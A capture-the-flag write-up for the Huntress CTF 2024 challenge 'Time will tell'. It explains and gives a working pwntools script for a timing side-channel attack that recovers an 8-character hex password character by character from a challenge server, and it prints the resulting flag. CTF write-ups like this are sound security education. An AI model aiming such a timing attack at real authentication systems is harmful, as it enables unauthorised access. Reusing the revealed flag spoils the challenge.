# Time will tell

![image](https://github.com/user-attachments/assets/9cdc050f-df9b-4833-a387-cb199414cafb)

Download: [app.py](https://raw.githubusercontent.com/LazyTitan33/CTF-Writeups/refs/heads/main/Huntress-CTF-2024/challenge-files/app.py)

## My Solution

As the challenge description already says, this is a side-channel timing attack where if we put an 8 character string starting with a valid character, the response from the server will be slightly longer than if we don't. This can be measured and used to figure out the correct password to get the flag:  

```python
from pwn import *
import time

# Set up the connection to the server
r = remote('challenge.ctf.games', 30545)
# r = remote('localhost', 1337)

# Receive initial messages
initial_message = r.recvuntil(b': ')
print(initial_message.decode())  # Print the initial message

# Initialize the password variable
password = b'aaaaaaaa'  # Start with a default guess

# Start with a base threshold for timing
base_time = 0.35

# Loop through each position in the password
for position in range(8):
    found_character = False  # Flag to check if the character is found

    for char in '0123456789abcdef':  # Possible characters
        guess = password[:position] + bytes(char, 'utf-8') + password[position + 1:]  # Update the guess
        print(f"Trying guess: {guess.decode()}")  # Print current guess

        # Measure the time taken to send the guess and receive the response
        start_time = time.time()
        r.sendline(guess)  # Send the current guess

        # Wait for the response
        response = r.recvline()  # Receive the response line
        end_time = time.time()

        # Print the response and the time taken
        print(response.decode())  # Print the server's response
        threshold = end_time - start_time
        print(f"Time taken for guess '{guess.decode()}': {threshold:.6f} seconds")

        # Check if the response time indicates a correct character
        if threshold > base_time:
            print(f"Character '{char}' at position {position} is likely correct.")
            password = guess  # Update the password with the correct character
            found_character = True
            base_time += 0.1  # Increase the threshold for the next character
            print(f"Updated base time: {base_time:.2f}")
            break  # Move to the next character position

    # If no character was found for this position, notify
    if not found_character:
        print(f"No correct character found at position {position}.")
        break  # Exit if no valid character was found

# Final output
print(f"Cracked password: {password.decode()}")
```

![image](https://github.com/user-attachments/assets/01df31e3-20fe-4aa0-b330-8ad703061e40)

`flag{ab6962e29ed608c0710dbf2910f358d5}`
